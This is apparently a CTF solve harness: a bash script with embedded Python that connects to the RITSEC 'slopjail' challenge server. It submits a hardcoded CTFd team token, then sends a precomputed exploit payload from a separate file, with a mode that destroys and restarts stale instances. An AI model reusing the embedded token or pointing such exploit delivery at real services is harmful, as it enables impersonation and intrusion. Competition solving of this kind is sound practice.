#!/usr/bin/env bash
set -euo pipefail

HOST="${HOST:-slopjail.ctf.ritsec.club}"
PORT="${PORT:-1900}"
TOKEN_DEFAULT='eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0aWQiOjI2MCwiaXNzIjoiY3RmZCJ9.OrmT1lGWzYHKSdQjkVCXiXzc3v2fyymQpJ-trIDN5DukCS1fQuy0T5pfN8-EaEfCg77pkbxXezpPbSFwWNQwy5v1-v08T-zcyRncb6Z-9Mcij0bYH6hjX5Iho8XTVQEE-NKQJYBHAEjw1dMxrIoXq2sK3hAvx1WKHy-20D279V_vLi4HNWgO_-38zEpo-hTp9SPFno9u_ckx_dN4rAFFolkLWMnytJNuA2l1mVD9hQcpn_NuigTCwJB1FhEC0WcNRkqRA64MDWR4dUWPZH4vhvXi0XlqavRD-9Rt7P-K-SoXXrFSqk-M_iWFGtuXjqn8Fvqc2nb1HkhNPd2GE3CRjw'
TOKEN="${TOKEN:-$TOKEN_DEFAULT}"
MODE="${1:-run}"

if [[ "$MODE" != "run" && "$MODE" != "destroy" ]]; then
  echo "usage: $0 [run|destroy]"
  exit 1
fi

if [[ "$MODE" == "run" && ! -f exploit.hex ]]; then
  echo "missing exploit.hex; run: python3 solve.py"
  exit 1
fi

export HOST PORT TOKEN MODE

python3 - <<'PY'
import os
import socket
import sys
import time
from pathlib import Path

HOST = os.environ["HOST"]
PORT = int(os.environ["PORT"])
TOKEN = os.environ["TOKEN"]
MODE = os.environ["MODE"]
PAYLOAD = Path("exploit.hex").read_text().strip() + "\n" if MODE == "run" else None


def recv_until_any(sock, needles, timeout=120):
    end = time.time() + timeout
    buf = ""
    while time.time() < end:
        sock.settimeout(1.0)
        try:
            data = sock.recv(65536)
        except TimeoutError:
            continue
        if not data:
            break
        text = data.decode("utf-8", "replace")
        buf += text
        sys.stdout.write(text)
        sys.stdout.flush()
        for needle in needles:
            if needle in buf:
                return buf, needle
    raise SystemExit(f"timed out waiting for one of: {needles}")


def send_payload(sock):
    sock.settimeout(120.0)
    sock.sendall(PAYLOAD.encode())


def connect_once(mode):
    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        recv_until_any(sock, ["Enter your CTFd team token:"])
        sock.sendall((TOKEN + "\n").encode())

        buf, which = recv_until_any(
            sock,
            [
                "Choice:",
                "gimme slop:",
                "Goodbye.",
                "An error occurred.",
                "Connecting you now...",
                "Instance ready",
                "Destroy your team's instance? [y/N]:",
            ],
            timeout=180,
        )

        if mode == "destroy":
            if "Choice:" not in buf:
                raise SystemExit("destroy mode expected the instance menu but did not get it")
            sock.sendall(b"2\n")
            recv_until_any(sock, ["Destroy your team's instance? [y/N]:"], timeout=30)
            sock.sendall(b"y\n")
            while True:
                sock.settimeout(2.0)
                try:
                    data = sock.recv(65536)
                except TimeoutError:
                    break
                if not data:
                    break
                sys.stdout.write(data.decode("utf-8", "replace"))
                sys.stdout.flush()
            return "destroyed"

        if "Choice:" in buf:
            sock.sendall(b"1\n")
            tail = ""
            start = time.time()
            while time.time() - start < 20:
                sock.settimeout(1.0)
                try:
                    data = sock.recv(65536)
                except TimeoutError:
                    continue
                if not data:
                    break
                text = data.decode("utf-8", "replace")
                tail += text
                sys.stdout.write(text)
                sys.stdout.flush()
                if "gimme slop:" in tail:
                    send_payload(sock)
                    break
                if "An error occurred." in tail:
                    return "stale_instance"
            else:
                return "stale_instance"
        else:
            if "gimme slop:" not in buf:
                recv_until_any(sock, ["gimme slop:"], timeout=180)
            send_payload(sock)

        end = time.time() + 90
        while True:
            remaining = end - time.time()
            if remaining <= 0:
                break
            sock.settimeout(min(10.0, remaining))
            try:
                data = sock.recv(65536)
            except TimeoutError:
                continue
            if not data:
                break
            sys.stdout.write(data.decode("utf-8", "replace"))
            sys.stdout.flush()
        return "done"


if MODE == "destroy":
    connect_once("destroy")
    raise SystemExit(0)

result = connect_once("run")
if result == "stale_instance":
    sys.stderr.write("\ninstance looks stale; destroying and retrying once...\n")
    sys.stderr.flush()
    time.sleep(1)
    connect_once("destroy")
    time.sleep(1)
    connect_once("run")
PY
